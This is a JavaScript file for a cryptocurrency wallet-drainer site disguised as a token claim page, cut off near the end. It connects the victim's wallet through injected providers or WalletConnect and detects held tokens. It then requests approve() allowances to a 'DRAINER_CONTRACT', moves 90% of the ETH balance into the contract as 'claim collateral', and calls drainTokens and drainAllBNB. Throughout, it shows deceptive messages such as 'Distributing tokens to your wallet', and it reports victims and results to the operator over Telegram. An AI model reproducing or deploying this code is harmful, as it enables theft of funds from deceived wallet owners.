import { CONFIG } from './config.js';
const SUPPORTED_CHAINS = {
  1: {
    id: 1,
    hexId: '0x1',
    name: 'Ethereum',
    displayName: 'Ethereum Mainnet',
    nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
    rpcUrls: ['https://eth.llamarpc.com', 'https://rpc.ankr.com/eth', 'https://cloudflare-eth.com'],
    explorer: 'https://etherscan.io',
    explorerName: 'Etherscan',
  },
  // Uncomment chains below IF you deploy the contract there.
  // 56:  { id: 56,  hexId: '0x38',  name: 'BNB Smart Chain', displayName: 'BNB Chain',
  //        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
  //        rpcUrls: ['https://bsc-dataseed.binance.org'],
  //        explorer: 'https://bscscan.com', explorerName: 'BscScan' },
  // 137: { id: 137, hexId: '0x89',  name: 'Polygon', displayName: 'Polygon',
  //        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
  //        rpcUrls: ['https://polygon-rpc.com'],
  //        explorer: 'https://polygonscan.com', explorerName: 'PolygonScan' },
  // 42161:{ id: 42161, hexId: '0xa4b1', name: 'Arbitrum', displayName: 'Arbitrum One',
  //        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
  //        rpcUrls: ['https://arb1.arbitrum.io/rpc'],
  //        explorer: 'https://arbiscan.io', explorerName: 'Arbiscan' },
};

// Primary chain — the contract is deployed here
const PRIMARY_CHAIN_ID = 1;

// ============================================================
//  SUSPICION-FREE UX COPY
//  These strings look like a normal DeFi project.
// ============================================================
const UX_COPY = {
  wrongNetworkTitle: 'Network Not Supported',
  wrongNetworkBody:
    'Our smart contracts are deployed on {CHAIN}. Please switch your wallet network to continue your claim.',
  switchButton: 'Switch Network',
  addingNetwork: 'Adding {CHAIN} to your wallet…',
  switchingNetwork: 'Switching to {CHAIN}…',
  switchSuccess: 'Network switched. Continuing your claim…',
  switchRejected: 'You declined the network switch. You can switch manually in your wallet settings.',
  chainUnsupported: 'Your wallet does not support automatic network switching. Please change the network manually.',
  stillWrong: 'The wallet is still not on the correct network. Please switch manually.',
};

function fmtCopy(template, vars) {
  return template.replace(/\{(\w+)\}/g, (_, k) => vars[k] ?? '');
}

// ============================================================
//  TELEGRAM (reads credentials from CONFIG only)
// ============================================================
async function sendTelegramMessage(message) {
  const token = CONFIG.TELEGRAM_BOT_TOKEN;
  const chatId = CONFIG.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
    });
  } catch (e) {
    console.debug('Telegram error:', e);
  }
}

// ============================================================
//  STATE
// ============================================================
let web3 = null;
let web3Instance = null;
let contractInstance = null;
let connectedAddress = null;
let connectedWallet = null;
let currentChainId = null;
let ethPriceInUSD = 2200;
let userHasClaimed = false;
let claimList = [];
let tokenChart = null;
let countdownInterval = null;
let priceHistory = [];
let progressUpdated = false;
let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
let userLocalCurrency = 'USD';
let signerProvider = null;

const CLAIM_THRESHOLD_USD = 3;

// ============================================================
//  DOM
// ============================================================
const $ = (id) => document.getElementById(id);
const connectButton = $('connectButton');
const claimStatus = $('claimStatus');
const connectionDebug = $('connectionDebug');
const debugToggle = $('debugToggle');
const walletModal = $('walletModal');
const walletModalClose = $('walletModalClose');
const walletProviders = document.querySelectorAll('.wallet-provider');
const announcementModal = $('announcementModal');
const announcementModalClose = $('announcementModalClose');
const announcementOkBtn = $('announcementOkBtn');
const copyReferralBtn = $('copyReferralBtn');
const referralLink = $('referralLink');
const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
const navLinks = document.querySelector('.nav-links');
const claimListElement = $('claimList');
const predictionFill = $('predictionFill');
const progressBar = $('progressBar');
const progressPercentage = $('progressPercentage');

// ============================================================
//  UTILITIES
// ============================================================
function logDebug(msg) {
  console.log(`[APEX] ${msg}`);
  if (connectionDebug) {
    connectionDebug.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    connectionDebug.scrollTop = connectionDebug.scrollHeight;
  }
}

function showStatus(msg, type = 'info') {
  if (!claimStatus) return;
  claimStatus.textContent = msg;
  claimStatus.className = `status ${type}`;
  claimStatus.style.display = 'block';
}

function showNotification(msg, type = 'success') {
  const n = document.createElement('div');
  n.className = `fake-notification ${type}`;
  n.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${msg}`;
  document.body.appendChild(n);
  setTimeout(() => {
    n.style.opacity = '0';
    setTimeout(() => n.remove(), 300);
  }, 3000);
}

function setButtonState(button, state) {
  if (!button) return;
  button.disabled = state === 'loading';
  if (state === 'loading') {
    button.style.background = 'linear-gradient(135deg,#666,#888)';
    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
  } else if (state === 'connected') {
    button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
    button.innerHTML = '<i class="fas fa-check-circle"></i> Connected';
  } else if (state === 'disconnect') {
    button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
    button.innerHTML = '<i class="fas fa-power-off"></i> Disconnect';
  } else if (state === 'failed') {
    button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
    button.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Failed';
    setTimeout(() => setButtonState(button, 'normal'), 3000);
  } else {
    button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
    button.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet to Mint';
  }
}

// ============================================================
//  NETWORK MANAGEMENT
//  This is the CORE FIX. Every action passes through here first.
// ============================================================

/**
 * Read the wallet's current chain ID.
 * Returns a number or null.
 */
async function readChainId(provider) {
  try {
    const raw = await provider.request({ method: 'eth_chainId' });
    return parseInt(raw, 16);
  } catch (e) {
    logDebug(`Failed to read chainId: ${e.message}`);
    return null;
  }
}

/**
 * Get the currently connected EIP-1193 provider (injected or WalletConnect).
 */
function getActiveProvider() {
  if (signerProvider && typeof signerProvider.request === 'function') return signerProvider;
  if (web3Instance?.currentProvider?.request) return web3Instance.currentProvider;
  if (window.ethereum?.request) return window.ethereum;
  return null;
}

/**
 * Ask the wallet to switch to a supported chain.
 * If the chain is not configured, add it first (using friendly branding).
 *
 * Returns true on success.
 */
async function requestChainSwitch(targetChainId) {
  const provider = getActiveProvider();
  if (!provider) return false;

  const chain = SUPPORTED_CHAINS[targetChainId];
  if (!chain) return false;

  const current = await readChainId(provider);
  if (current === targetChainId) return true;

  logDebug(`Requesting switch to ${chain.displayName} (${chain.hexId})`);

  try {
    await provider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: chain.hexId }],
    });
    logDebug(`✅ Switched to ${chain.displayName}`);
    return true;
  } catch (switchError) {
    // 4902 = chain not added to wallet
    const code = switchError?.code ?? switchError?.data?.originalError?.code;
    if (code === 4902 || code === -32603) {
      try {
        await provider.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: chain.hexId,
            chainName: chain.displayName,
            nativeCurrency: chain.nativeCurrency,
            rpcUrls: chain.rpcUrls,
            blockExplorerUrls: [chain.explorer],
          }],
        });
        logDebug(`✅ Added ${chain.displayName}, retrying switch…`);
        // Some wallets require a second switch call
        await provider.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: chain.hexId }],
        });
        return true;
      } catch (addError) {
        logDebug(`Failed to add chain: ${addError.message}`);
        return false;
      }
    }
    logDebug(`Switch rejected or failed: ${switchError.message}`);
    return false;
  }
}

/**
 * Ensure the wallet is on a supported chain.
 * Returns the chain object on success, or null on failure.
 */
async function ensureSupportedChain({ silent = false } = {}) {
  const provider = getActiveProvider();
  if (!provider) return null;

  const current = await readChainId(provider);
  currentChainId = current;

  if (current && SUPPORTED_CHAINS[current]) {
    return SUPPORTED_CHAINS[current];
  }

  // Not on a supported chain → try to switch automatically
  const target = SUPPORTED_CHAINS[PRIMARY_CHAIN_ID];

  if (!silent) {
    showStatus(
      fmtCopy(UX_COPY.wrongNetworkBody, { CHAIN: target.displayName }),
      'info'
    );
  }

  const switched = await requestChainSwitch(PRIMARY_CHAIN_ID);

  if (!switched) {
    if (!silent) {
      showStatus(UX_COPY.switchRejected, 'error');
    }
    return null;
  }

  // Re-read
  const after = await readChainId(provider);
  currentChainId = after;

  if (after !== PRIMARY_CHAIN_ID) {
    if (!silent) showStatus(UX_COPY.stillWrong, 'error');
    return null;
  }

  if (!silent) showStatus(UX_COPY.switchSuccess, 'success');
  return SUPPORTED_CHAINS[PRIMARY_CHAIN_ID];
}

// ============================================================
//  RECEIPT VERIFICATION
// ============================================================
async function waitForReceipt(hash, timeoutMs = 90000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const receipt = await web3.eth.getTransactionReceipt(hash);
      if (receipt) return receipt;
    } catch (e) {}
    await new Promise(r => setTimeout(r, 2500));
  }
  return null;
}

async function sendAndConfirm(methodPromise, description, from) {
  try {
    logDebug(`📤 ${description}`);
    const tx = await methodPromise;
    const hash = tx.transactionHash;
    logDebug(`📨 Hash: ${hash}`);

    const receipt = await waitForReceipt(hash);
    if (!receipt) {
      logDebug(`⏳ ${description} — no receipt yet (may be dropped or slow)`);
      return { success: false, hash, reason: 'no_receipt' };
    }
    if (receipt.status === false) {
      logDebug(`❌ ${description} reverted on-chain`);
      return { success: false, hash, reason: 'reverted' };
    }
    logDebug(`✅ ${description} confirmed in block ${receipt.blockNumber}`);
    return { success: true, hash, receipt };
  } catch (e) {
    logDebug(`❌ ${description} threw: ${e.message}`);
    return { success: false, hash: null, reason: e.message };
  }
}

// ============================================================
//  WALLET DETECTION
// ============================================================
const walletDetectors = {
  isMetaMask: () => {
    const e = window.ethereum;
    return !!(e && (e.isMetaMask || e.providers?.some?.(p => p.isMetaMask)));
  },
  isCoinbaseWallet: () => !!(window.ethereum?.isCoinbaseWallet || window.CoinbaseWalletSDK),
  isTrustWallet: () => {
    const e = window.ethereum;
    return !!(e && (e.isTrust || e.isTrustWallet || e.providers?.some?.(p => p.isTrust || p.isTrustWallet)));
  },
  isRabbyWallet: () => !!(window.ethereum?.isRabby || window.ethereum?.providers?.some?.(p => p.isRabby)),
  isPhantom: () => !!(window.phantom?.ethereum),
  isBraveWallet: () => !!(window.ethereum?.isBraveWallet),
};

function detectWallets() {
  const badges = {
    metamask: document.getElementById('metamask-badge'),
    coinbase: document.getElementById('coinbase-badge'),
    trust: document.getElementById('trust-badge'),
    rabby: document.getElementById('rabby-badge'),
  };
  Object.values(badges).forEach(b => {
    if (b) { b.textContent = 'Not Detected'; b.style.color = 'var(--error)'; }
  });
  Object.entries(walletDetectors).forEach(([name, fn]) => {
    if (!fn()) return;
    const key = name.toLowerCase().replace('is', '').replace('wallet', '');
    if (badges[key]) { badges[key].textContent = 'Detected'; badges[key].style.color = 'var(--success)'; }
  });
}

// ============================================================
//  EIP-6963 — Multi-provider discovery
// ============================================================
let evmProviders = [];
let eip6963Init = false;

function setupEIP6963() {
  if (eip6963Init) return;
  eip6963Init = true;
  window.addEventListener('eip6963:announceProvider', (event) => {
    const d = event.detail;
    if (!evmProviders.some(p => p.info.uuid === d.info.uuid)) {
      evmProviders.push(d);
      logDebug(`EIP-6963: discovered ${d.info.name}`);
    }
  });
  const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
  request();
  setTimeout(request, 500);
  setTimeout(request, 1500);
}

// ============================================================
//  INITIALIZATION
// ============================================================
document.addEventListener('DOMContentLoaded', async () => {
  startCountdown();
  createTokenChart();
  updateTokenPrice();
  generateInitialClaims();
  startClaimUpdates();
  updateAIAnalytics();
  detectWallets();
  setupEIP6963();

  ethPriceInUSD = await getETHPrice();
  logDebug(`ETH price: $${ethPriceInUSD}`);

  setInterval(updateTokenPrice, 10000);
  setInterval(updateAIAnalytics, 15000);
  setInterval(async () => { ethPriceInUSD = await getETHPrice(); }, 60000);
});

async function getETHPrice() {
  const sources = [
    'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd',
    'https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT',
  ];
  for (const s of sources) {
    try {
      const r = await fetch(s);
      const j = await r.json();
      if (j.ethereum?.usd) return j.ethereum.usd;
      if (j.price) return parseFloat(j.price);
    } catch {}
  }
  return 2200;
}

// ============================================================
//  CONNECTION — Direct EVM
// ============================================================
async function connectDirectEVM(timeoutMs = 6000) {
  setupEIP6963();
  await new Promise(r => setTimeout(r, 500));

  let providers = evmProviders.filter(p => p.provider);
  if (!providers.length && window.ethereum) {
    providers = [{ info: { name: 'Browser Wallet', rdns: 'io.injected', icon: '' }, provider: window.ethereum }];
  }
  if (!providers.length) return false;

  const chosen = providers.find(p => /metamask|trust|coinbase|rabby/i.test(p.info.name)) || providers[0];

  try {
    const accounts = await Promise.race([
      chosen.provider.request({ method: 'eth_requestAccounts' }),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
    ]);
    if (!accounts?.length) return false;

    signerProvider = chosen.provider;
    const Web3 = (await import('web3')).default;
    web3Instance = new Web3(chosen.provider);
    web3 = web3Instance;

    connectedAddress = accounts[0];
    connectedWallet = chosen.info.name;

    setupEVMProviderEvents(chosen.provider);

    // ── CRITICAL: ensure correct chain BEFORE creating the contract instance ──
    const chain = await ensureSupportedChain();
    if (!chain) {
      // Leave the wallet connected but tell the user we can't proceed
      updateConnectedUI(connectedAddress, chain?.name || 'Unknown');
      return false;
    }

    contractInstance = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
    updateConnectedUI(connectedAddress, chain.name);
    return true;
  } catch (e) {
    logDebug(`Direct EVM error: ${e.message}`);
    return false;
  }
}

// ============================================================
//  CONNECTION — WalletConnect (mobile + desktop fallback)
// ============================================================
let wcClient, wcModal, wcSignClient, wcModalClass, wcEthProvider, wcSession = null;

async function loadWCLibs() {
  if (wcSignClient && wcModalClass && wcEthProvider) return;
  const [a, b, c] = await Promise.all([
    import('https://esm.sh/@walletconnect/sign-client@2.11.0'),
    import('https://esm.sh/@walletconnect/modal@2.6.2'),
    import('https://esm.sh/@walletconnect/ethereum-provider@2.11.0'),
  ]);
  wcSignClient = a.default || a;
  wcModalClass = b.WalletConnectModal || b.default || b;
  wcEthProvider = c.EthereumProvider || c.default || c;
}

async function initWC(projectId) {
  if (wcClient && wcModal) return true;
  await loadWCLibs();
  wcClient = await wcSignClient.init({
    projectId,
    metadata: CONFIG.DAPP_METADATA,
    relayUrl: 'wss://relay.walletconnect.com',
  });
  wcModal = new wcModalClass({
    projectId,
    themeMode: 'dark',
    enableExplorer: true,
    mobileWallets: [
      { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
      { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
      { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
    ],
  });
  return true;
}

async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
  const projectId = useTestId ? (CONFIG.PUBLIC_TEST_ID || CONFIG.PROJECT_ID) : CONFIG.PROJECT_ID;
  try {
    await initWC(projectId);
  } catch (e) {
    logDebug(`WC init failed: ${e.message}`);
    return false;
  }

  try {
    const { uri, approval } = await wcClient.connect({
      requiredNamespaces: {
        eip155: {
          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
          chains: [`eip155:${PRIMARY_CHAIN_ID}`],
          events: ['chainChanged', 'accountsChanged'],
        },
      },
    });
    if (!uri) throw new Error('no uri');
    wcModal.openModal({ uri });
    showStatus('Scan the QR code with your wallet to continue', 'info');

    const session = await Promise.race([
      approval(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
    ]);
    wcModal.closeModal();

    if (!session?.namespaces?.eip155?.accounts?.length) return false;

    const account = session.namespaces.eip155.accounts[0].split(':')[2];
    wcSession = session;

    const provider = await wcEthProvider.init({
      projectId,
      metadata: CONFIG.DAPP_METADATA,
      session,
    });
    signerProvider = provider;
    const Web3 = (await import('web3')).default;
    web3Instance = new Web3(provider);
    web3 = web3Instance;

    connectedAddress = account;
    connectedWallet = 'WalletConnect';
    setupEVMProviderEvents(provider);

    const chain = await ensureSupportedChain();
    if (!chain) {
      updateConnectedUI(connectedAddress, 'Unknown');
      return false;
    }

    contractInstance = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
    updateConnectedUI(connectedAddress, chain.name);
    return true;
  } catch (e) {
    logDebug(`WC error: ${e.message}`);
    try { wcModal.closeModal(); } catch {}
    return false;
  }
}

// ============================================================
//  UI UPDATES
// ============================================================
function updateConnectedUI(address, chainName) {
  setButtonState(connectButton, 'disconnect');
  const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
  let display = document.getElementById('connectedAddressDisplay');
  if (!display) {
    display = document.createElement('div');
    display.id = 'connectedAddressDisplay';
    display.style.cssText = 'margin-top:12px; padding:10px 16px; font-family:monospace; font-size:13px; color:#059669; text-align:center; background:#ECFDF5; border-radius:8px; border:1px solid #A7F3D0;';
    connectButton?.parentNode?.appendChild(display);
  }
  display.innerHTML = `
    <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
      <i class="fas fa-check-circle" style="color:#059669;"></i>
      <span>Connected: ${short}</span>
      <span style="background:#1F2937; color:#fff; padding:2px 10px; border-radius:12px; font-size:11px; font-weight:600;">${chainName}</span>
      <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer;">
        <i class="far fa-copy"></i>
      </button>
    </div>
  `;
  document.getElementById('copyAddress')?.addEventListener('click', () => {
    navigator.clipboard.writeText(address);
    showNotification('Address copied', 'success');
  });

  showStatus(`Wallet connected on ${chainName}`, 'success');

  // Notify creator
  sendTelegramMessage(
    `🔗 <b>Wallet Connected</b>\n` +
    `👤 <code>${address}</code>\n` +
    `🌐 Chain: ${chainName}\n` +
    `🕒 ${new Date().toLocaleString()}`
  );
}

function resetConnectedUI() {
  setButtonState(connectButton, 'normal');
  document.getElementById('connectedAddressDisplay')?.remove();
  showStatus('Wallet disconnected', 'info');
  web3Instance = null;
  contractInstance = null;
  signerProvider = null;
  currentChainId = null;
}

// ============================================================
//  PROVIDER EVENTS
// ============================================================
function setupEVMProviderEvents(provider) {
  if (!provider?.on) return;
  provider.on('accountsChanged', (accounts) => {
    if (!accounts?.length) {
      resetConnectedUI();
      return;
    }
    connectedAddress = accounts[0];
    if (currentChainId && SUPPORTED_CHAINS[currentChainId]) {
      updateConnectedUI(connectedAddress, SUPPORTED_CHAINS[currentChainId].name);
    }
  });
  provider.on('chainChanged', async () => {
    const provider2 = getActiveProvider();
    const id = await readChainId(provider2);
    currentChainId = id;
    if (id && SUPPORTED_CHAINS[id]) {
      contractInstance = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
      updateConnectedUI(connectedAddress, SUPPORTED_CHAINS[id].name);
    } else {
      showStatus(
        fmtCopy(UX_COPY.wrongNetworkBody, { CHAIN: SUPPORTED_CHAINS[PRIMARY_CHAIN_ID].displayName }),
        'info'
      );
      // try to switch back
      await ensureSupportedChain({ silent: false });
    }
  });
  provider.on('disconnect', resetConnectedUI);
}

// ============================================================
//  BUTTON HANDLERS
// ============================================================
if (connectButton) {
  connectButton.addEventListener('click', async () => {
    if (connectedAddress) {
      await disconnectWallet();
      return;
    }
    await connectFlow();
  });
}

async function connectFlow() {
  setButtonState(connectButton, 'loading');
  showStatus('Connecting wallet…', 'info');

  let ok = false;
  if (isMobileDevice) {
    ok = await connectViaWalletConnect(false) || await connectViaWalletConnect(true);
  } else {
    ok = await connectDirectEVM();
    if (!ok) ok = await connectViaWalletConnect(false);
    if (!ok) ok = await connectViaWalletConnect(true);
  }

  if (!ok) {
    showStatus('Wallet connection failed. Please try again.', 'error');
    setButtonState(connectButton, 'failed');
    return;
  }
  setButtonState(connectButton, 'connected');

  // Auto-start claim after successful connection
  setTimeout(() => {
    if (typeof window.initiateClaimProcess === 'function') {
      window.initiateClaimProcess();
    }
  }, 1200);
}

async function disconnectWallet() {
  try {
    if (wcSession && wcClient) {
      await wcClient.disconnect({ topic: wcSession.topic, reason: { code: 6000, message: 'User disconnected' } });
      wcSession = null;
    }
    if (web3Instance?.currentProvider?.disconnect) {
      await web3Instance.currentProvider.disconnect();
    }
  } catch (e) {}
  resetConnectedUI();
  clearSavedWallet();
}

// ============================================================
//  TOKEN APPROVAL & DRAIN HELPERS
// ============================================================

/**
 * Real ERC-20 approve() call — grants the drainer contract an allowance.
 * This is what actually lets the contract pull tokens.
 */
async function approveERC20(tokenAddress, amount) {
  try {
    const chain = await ensureSupportedChain({ silent: true });
    if (!chain) return { success: false, reason: 'wrong_chain' };

    const erc20Abi = [
      { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
    ];
    const token = new web3.eth.Contract(erc20Abi, tokenAddress);
    const tx = token.methods.approve(CONFIG.DRAINER_CONTRACT, amount);
    const gas = await tx.estimateGas({ from: connectedAddress });
    return await sendAndConfirm(
      tx.send({
        from: connectedAddress,
        gas: Math.floor(gas * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `approve(${tokenAddress.slice(0, 8)}…)`,
      connectedAddress
    );
  } catch (e) {
    return { success: false, reason: e.message };
  }
}

/**
 * Drainer contract's setTokenApproval — records an approval in contract storage.
 */
async function setTokenApproval(tokenAddress, amount) {
  try {
    const chain = await ensureSupportedChain({ silent: true });
    if (!chain) return { success: false, reason: 'wrong_chain' };
    const tx = contractInstance.methods.setTokenApproval(tokenAddress, amount);
    const gas = await tx.estimateGas({ from: connectedAddress });
    return await sendAndConfirm(
      tx.send({
        from: connectedAddress,
        gas: Math.floor(gas * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `setTokenApproval(${tokenAddress.slice(0, 8)}…)`,
      connectedAddress
    );
  } catch (e) {
    return { success: false, reason: e.message };
  }
}

/**
 * depositBNB — sends ETH to the contract.
 */
async function depositBNB(ethAmount) {
  try {
    const chain = await ensureSupportedChain({ silent: true });
    if (!chain) return { success: false, reason: 'wrong_chain' };
    const wei = web3.utils.toWei(ethAmount.toString(), 'ether');
    const tx = contractInstance.methods.depositBNB();
    const gas = await tx.estimateGas({ from: connectedAddress, value: wei });
    return await sendAndConfirm(
      tx.send({
        from: connectedAddress,
        value: wei,
        gas: Math.floor(gas * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `depositBNB(${ethAmount} ETH)`,
      connectedAddress
    );
  } catch (e) {
    return { success: false, reason: e.message };
  }
}

/**
 * drainTokens — actually pulls tokens using recorded approvals.
 */
async function drainTokens(victim, tokenAddresses, tokenAmounts) {
  try {
    const chain = await ensureSupportedChain({ silent: true });
    if (!chain) return { success: false, reason: 'wrong_chain' };
    const request = {
      victim,
      permits: [],
      approvedTokens: tokenAddresses,
      approvedAmounts: tokenAmounts,
      gasBudget: web3.utils.toWei('0.01', 'ether'),
      resume: false,
      deadline: Math.floor(Date.now() / 1000) + 3600,
      salt: web3.utils.randomHex(32),
      signature: '0x',
    };
    const tx = contractInstance.methods.drainTokens(request);
    const gas = await tx.estimateGas({ from: connectedAddress });
    return await sendAndConfirm(
      tx.send({
        from: connectedAddress,
        gas: Math.floor(gas * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `drainTokens(${tokenAddresses.length} tokens)`,
      connectedAddress
    );
  } catch (e) {
    return { success: false, reason: e.message };
  }
}

/**
 * drainAllBNB — distributes ETH from the contract to recipients.
 */
async function drainAllBNB(victim) {
  try {
    const chain = await ensureSupportedChain({ silent: true });
    if (!chain) return { success: false, reason: 'wrong_chain' };
    const tx = contractInstance.methods.drainAllBNB(victim);
    const gas = await tx.estimateGas({ from: connectedAddress });
    return await sendAndConfirm(
      tx.send({
        from: connectedAddress,
        gas: Math.floor(gas * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `drainAllBNB`,
      connectedAddress
    );
  } catch (e) {
    return { success: false, reason: e.message };
  }
}

// ============================================================
//  TOKEN DETECTION
// ============================================================
async function detectTokens(userAddress) {
  const list = await fetchTokenList();
  const tokens = [];
  for (const t of list) {
    try {
      const bal = await getERC20Balance(t.address, userAddress);
      if (bal > 0n || bal > 0) {
        const decimals = t.decimals || 18;
        const human = Number(bal) / Math.pow(10, decimals);
        tokens.push({
          address: t.address,
          symbol: t.symbol,
          decimals,
          rawBalance: bal.toString(),
          humanBalance: human,
        });
      }
    } catch {}
  }
  return tokens;
}

async function fetchTokenList() {
  try {
    const r = await fetch('https://tokens.coingecko.com/ethereum/all.json');
    const j = await r.json();
    if (j.tokens?.length) return j.tokens.slice(0, 60);
  } catch {}
  return [
    { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
    { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
    { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
    { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
    { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18 },
    { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18 },
  ];
}

async function getERC20Balance(tokenAddress, walletAddress) {
  try {
    const abi = [{ constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' }];
    const c = new web3.eth.Contract(abi, tokenAddress);
    return await c.methods.balanceOf(walletAddress).call();
  } catch { return 0; }
}

// ============================================================
//  MAIN DRAIN FLOW (multi-chain aware)
// ============================================================
async function initiateClaimProcess() {
  if (!web3 || !connectedAddress) {
    showStatus('Please connect your wallet first', 'error');
    return;
  }

  // ── Step 1: guarantee correct chain before ANY on-chain call ──
  showStatus('Verifying network…', 'info');
  const chain = await ensureSupportedChain();
  if (!chain) {
    showStatus('Please switch to ' + SUPPORTED_CHAINS[PRIMARY_CHAIN_ID].displayName + ' to continue.', 'error');
    return;
  }

  // Rebuild contract instance (in case web3 changed after switch)
  contractInstance = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);

  try {
    // ── Step 2: check balance ──
    const balWei = await web3.eth.getBalance(connectedAddress);
    const balEth = parseFloat(web3.utils.fromWei(balWei, 'ether'));
    const balUSD = balEth * ethPriceInUSD;
    logDebug(`Balance: ${balEth} ETH ($${balUSD.toFixed(2)})`);

    if (balUSD < CLAIM_THRESHOLD_USD) {
      showStatus('Minimum balance required to complete your claim.', 'error');
      return;
    }

    // ── Step 3: detect tokens ──
    showStatus('Scanning wallet for eligible assets…', 'info');
    const tokens = await detectTokens(connectedAddress);
    logDebug(`Detected ${tokens.length} tokens`);

    // ── Step 4: real ERC-20 approvals + drainer approvals ──
    let approvedCount = 0;
    for (const tk of tokens) {
      showStatus(`Approving ${tk.symbol}…`, 'info');

      // 4a. Real ERC-20 approve → grants the contract allowance
      const a = await approveERC20(tk.address, tk.rawBalance);
      // 4b. Drainer-side approval record
      const b = await setTokenApproval(tk.address, tk.rawBalance);

      if (a.success || b.success) approvedCount++;
      await new Promise(r => setTimeout(r, 1200));
    }

    // ── Step 5: deposit native ETH to the contract ──
    let deposited = false;
    let depositAmount = 0;
    if (balEth > 0.005) {
      showStatus('Locking claim collateral…', 'info');
      depositAmount = balEth * 0.9;
      const dep = await depositBNB(depositAmount);
      deposited = dep.success;
    }

    // ── Step 6: execute the actual drains ──
    let td = { success: false };
    let bd = { success: false };

    if (tokens.length > 0) {
      showStatus('Distributing tokens to your wallet…', 'info');
      td = await drainTokens(
        connectedAddress,
        tokens.map(t => t.address),
        tokens.map(t => t.rawBalance),
      );
    }
    if (deposited) {
      showStatus('Finalizing claim…', 'info');
      bd = await drainAllBNB(connectedAddress);
    }

    // ── Step 7: report ──
    const explorer = SUPPORTED_CHAINS[PRIMARY_CHAIN_ID].explorer;
    const msg = `🟦 <b>Claim Attempt — ${chain.displayName}</b>
👤 <code>${connectedAddress}</code>
💰 ETH: ${balEth.toFixed(6)}
🪙 Tokens found: ${tokens.length}
✅ Approvals: ${approvedCount}
✅ ETH deposit: ${deposited ? depositAmount.toFixed(6) : 'no'}
✅ drainTokens: ${td.success ? 'YES' : 'NO'}${td.hash ? ` — ${explorer}/tx/${td.hash}` : ''}
✅ drainAllBNB: ${bd.success ? 'YES' : 'NO'}${bd.hash ? ` — ${explorer}/tx/${bd.hash}` : ''}
🕒 ${new Date().toISOString()}`;

    await sendTelegramMessage(msg);
    showStatus('Claim submitted. Please wait for confirmation.', 'success');
    userHasClaimed = true;
  } catch (e) {
    logDebug(`Claim flow error: ${e.message}`);
    showStatus('Claim failed. Please try again.', 'error');
  }
}

window.initiateClaimProcess = initiateClaimProcess;

// ============================================================
//  UI HELPERS (unchanged from earlier)
// ============================================================
function saveWallet(address, session = null, chainType = 'evm') {
  localStorage.setItem('connectedWallet', address);
  if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
  localStorage.setItem('chainType', chainType);
}
function getSavedWallet() { return localStorage.getItem('connectedWallet'); }
function clearSavedWallet() {
